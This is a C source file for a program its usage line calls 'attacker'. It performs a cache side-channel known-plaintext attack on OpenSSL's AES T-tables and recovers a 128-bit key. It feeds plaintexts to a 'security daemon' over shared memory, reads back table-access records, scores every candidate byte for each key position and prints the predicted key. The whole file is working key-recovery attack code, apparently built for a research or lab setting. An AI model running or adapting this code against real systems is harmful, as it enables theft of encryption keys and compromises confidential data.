#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "ipc.h"

#define KEY_BIT 128
#define MAX_PLAIN_TEXTS 1200

typedef unsigned char U8;

/* Random Plaintexts */
unsigned int plain_text_cnt = 0;
U8 plains[MAX_PLAIN_TEXTS][16] = {0,};

/* Subsets */
/* subset[plaintext index][key index][key byte] */
/* subset[2][1][17] == 1 ---> It means that if plaintext[2] && k1 == 17, 17 is candidate key byte for k1 */
int subset[MAX_PLAIN_TEXTS][16][256] = {0,};

/* candidate score */
int score[16][256] = {0,};

/* IPC with security daemon */
int ipc_fd;
void *addr;
struct shm_msg *client_msg;
struct shm_msg *server_msg;

/**
 * state_te0 ~ te3
 *	- It is access-records in openssl library.
 */
unsigned int state_te0[256] = {0,};
unsigned int state_te1[256] = {0,};
unsigned int state_te2[256] = {0,};
unsigned int state_te3[256] = {0,};

int security_daemon_connect(void)
{	
	/* get shm */
    if((ipc_fd = shm_open(SHM_NAME, O_RDWR, PERM_FILE)) == -1) {
        printf("shm_open error : %s\n", strerror(errno));
        return -1;
    }
	
	/* mmap */
    addr = mmap(NULL, MSG_SIZE_MAX, PROT_READ | PROT_WRITE, MAP_SHARED, ipc_fd, 0);
    if(addr == MAP_FAILED) {
        printf("mmap error : %s\n", strerror(errno));
        goto out;
    }
	
	client_msg = (struct shm_msg *)((char*)addr + SHM_CLIENT_BUF_IDX);
    server_msg = (struct shm_msg *)((char*)addr + SHM_SERVER_BUF_IDX);
	
	return 0;

out:
	/* close shm */
    if(munmap(addr, MSG_SIZE_MAX) == -1) {
        printf("munmap error : %s\n", strerror(errno));
	}
    if(close(ipc_fd) == -1) {
        printf("close error : %s\n", strerror(errno));
    }
	
	return -1;
}

int security_daemon_encrypt_msg(U8 *in, U8 *out, int size)
{
	/* prepare msg */
	client_msg->status = 0;
	client_msg->len = size;
	
	/* send msg */
	memcpy(client_msg->msg, in, client_msg->len);
	client_msg->status = 1;
	
	/* read reply */
	while(1) {
		if(server_msg->status == 1) {
			if(server_msg->len != 4096) {
				printf("It's not access-record!!\n");
				continue;
			}
			
			memcpy(state_te0, server_msg->msg, 1024);
			memcpy(state_te1, server_msg->msg + (1 * 1024), 1024);
			memcpy(state_te2, server_msg->msg + (2 * 1024), 1024);
			memcpy(state_te3, server_msg->msg + (3 * 1024), 1024);
			server_msg->status = 0;
			break;
		}
		sleep(0);
	}
	
	return 0;
}

void security_daemon_disconnect(void)
{
	/* send end msg */
	client_msg->status = 0;
	client_msg->len = sizeof(END_MSG);
	strncpy(client_msg->msg, END_MSG, client_msg->len);
	client_msg->status = 1;
	
	/* close shm */
	if(munmap(addr, MSG_SIZE_MAX) == -1) {
		printf("munmap error : %s\n", strerror(errno));
	}

	if(close(ipc_fd) == -1) {
		printf("close error : %s\n", strerror(errno));
	}
}

int openssl_fd;
U8 *openssl_map_addr = NULL;
unsigned int openssl_map_size = 0;

int map_openssl_aes_ttable(const char *path, unsigned int off_te0, unsigned int off_te1, unsigned int off_te2, unsigned int off_te3)
{
	struct stat filestat;
	
	/* Open file */
	openssl_fd = open(path, O_RDONLY);
	if (openssl_fd == -1) {
		printf("Could not open file: %s\n", path);
		return -1;
	}
	
    if (fstat(openssl_fd, &filestat) == -1) {
		printf("Could not obtain file information.\n");
		goto out;
    }
	
	openssl_map_size = filestat.st_size;
	openssl_map_addr = (U8*)mmap(0, openssl_map_size, PROT_READ, MAP_SHARED, openssl_fd, 0);
	if (openssl_map_addr == NULL) {
		fprintf(stderr, "Could not map file: %s\n", path);
		return -1;
	}
	
	/*
	state_te0 = (unsigned int*)(openssl_map_addr + off_te0);
	state_te1 = (unsigned int*)(openssl_map_addr + off_te1);
	state_te2 = (unsigned int*)(openssl_map_addr + off_te2);
	state_te3 = (unsigned int*)(openssl_map_addr + off_te3);*/
	
	return 0;
	
out:
	close(openssl_fd);
	return -1;
}

void unmap_openssl_aes_ttable(void)
{
	if(munmap(openssl_map_addr, openssl_map_size) == -1) {
		printf("munmap error : %s\n", strerror(errno));
	}

	if(close(openssl_fd) == -1) {
		printf("close error : %s\n", strerror(errno));
	}
}

/**
 * Util Functions
 */
void string_to_hex(U8 *pIn, unsigned int pInLen, U8 *pOut)
{
    unsigned int i, j;
    unsigned int mul;
    char data = 0;

    for(i=0, j=0; i<pInLen; i++) {
        if(i % 2 == 0)
            mul = 16;
        else
            mul = 1;

        if(pIn[i] >= '0' && pIn[i] <= '9')
            data += ((pIn[i] - 48) * mul);
        else if(pIn[i] >= 'a' && pIn[i] <= 'f')
            data += ((pIn[i] - 87) * mul);
        else if(pIn[i] >= 'A' && pIn[i] <= 'F')
            data += ((pIn[i] - 55) * mul);
        else
            return;

        if(mul == 1)
        {
            pOut[j] = data;
            data = 0;
            j++;
        }
    }
}

void hex_string_to_int(unsigned char *pIn, unsigned int pInLen, unsigned int *pOut)
{
    /* HexString must be Big-Endian!! */
    int is_little_endian = 0;
    unsigned int test = 0x10000001;
    char *ptr = (char*)&test;

    if(ptr[0] == 0x01)
    {
        is_little_endian = 1;
    }
    if(pInLen != sizeof(unsigned int) * 2)
    {
        return;
    }
    string_to_hex((unsigned char*)pIn, pInLen, (char*)pOut);

    if(is_little_endian)
    {
        char tmp;
        unsigned int i, j;

        ptr = (char*)pOut;
        for(i=0, j=sizeof(unsigned int)-1; i<sizeof(unsigned int); i++, j--)
        {
            if(i > j)
            {
                break;
            }
            tmp = ptr[i];
            ptr[i] = ptr[j];
            ptr[j] = tmp;
        }
    }
} 

void read_plains(int limit_cnt)
{
	FILE *fp = NULL;
	U8 tmp[33] = {0,};
	int i, j;
	
	fp = fopen("./plain.txt", "r");
	if(!fp)
		return;
	
	fscanf(fp, "%d\n", &plain_text_cnt);
	if(plain_text_cnt > limit_cnt)
		plain_text_cnt = limit_cnt;
	
	printf("plain_text_cnt : %d\n", plain_text_cnt);
	
	for(i=0; i<plain_text_cnt; i++) {
		memset(tmp, 0, sizeof(tmp));
		fscanf(fp, "%s\n", tmp);
		
		if(strlen(tmp) != 32) {
			printf("plaintext error!!\n");
			return;
		}
		
		string_to_hex(tmp, strlen(tmp), plains[i]);
	}
	fclose(fp);
}

/**
 * Synchronous Known-Data Attacks - One-Round Attack
 * 	- Ideal environment
 */
 
int is_useful(int te, int x)
{
	if(te == 0) {
		if(state_te0[x] > 0)
			return 1;
		return 0;
	}
	else if(te == 1) {
		if(state_te1[x] > 0)
			return 1;
		return 0;
	}
	else if(te == 2) {
		if(state_te2[x] > 0)
			return 1;
		return 0;
	}
	else if(te == 3) {
		if(state_te3[x] > 0)
			return 1;
		return 0;
	}
	
	return 0;
}

/* calculate all subset for userful samples */
void calc_subset(void)
{
	U8 enc[16] = {0,};
	int p, ki;
	unsigned int kbyte;
	int te, x;
	
	for(p=0; p<plain_text_cnt; p++) {		
		for(ki=0; ki<16; ki++) {		
			for(kbyte=0; kbyte<256; kbyte++) {
				/* get ideal one-round-after access */
				te = ki % 4;
				x = (plains[p][ki]) ^ (kbyte);
				
				/* get real full-round-after access. It means real-encryption process. */
				security_daemon_encrypt_msg(plains[p], enc, sizeof(enc));
				
				/* is it useful?? */
				subset[p][ki][kbyte] = is_useful(te, x);
			}
		}
	}
}

/* calcuate score */
void calc_score(void)
{
	int p, ki;
	unsigned int kbyte;
	
	for(p=0; p<plain_text_cnt; p++) {		
		for(ki=0; ki<16; ki++) {
			for(kbyte=0; kbyte<256; kbyte++) {
				score[ki][kbyte] += subset[p][ki][kbyte];
			}
		}
	}
}

/* predict real key by final score!! */
void predict_key(U8 *out_key)
{
	int ki, max = -1;
	unsigned int kbyte, best;
	
	for(ki=0; ki<16; ki++) {
		max = -1;
		
		for(kbyte=0; kbyte<256; kbyte++) {
			if(score[ki][kbyte] > max) {
				max = score[ki][kbyte];
				best = kbyte;
			}
		}
		
		out_key[ki] = best;
	}
}

void read_args(char **argv, int *limit_cnt)
{
	*limit_cnt = atoi(argv[1]);
}	

int main(int argc, char **argv)
{
	int i, r, limit_cnt;
	U8 cand_key[16] = {0,};
	
	if(argc != 2) {
		printf("USAGE : attacker <limit plain text count>\n");
		printf("EXAMPLE : attacker 50\n");
		return 0;
	}
	
	/* 1. Initialize */
	memset(plains, 0, sizeof(plains));
	memset(subset, 0, sizeof(subset));
	memset(score, 0, sizeof(score));
	
	r = security_daemon_connect();
	if(r) {
		printf("security_daemon_connect error\n");
		return 0;
	}
	printf("security_daemon_connect success\n");
	
	/* 2. Read args */
	read_args(argv, &limit_cnt);

	/* 3. Read random plaintexts */
	read_plains(limit_cnt);
	
	/* 4. Calculate all subsets */
	calc_subset();
	
	/* 5. Calculate score */
	calc_score();
	
	/* 6. Predict real key */
	predict_key(cand_key);
	
	/* 7. Print Reuslt */
	printf("predict key : ");
	for(i=0; i<16; i++)
		printf("%02x", cand_key[i]);
	printf("\n");
	
	/* 8. Disconnect security daemon */
out:
	security_daemon_disconnect();
	return 0;
}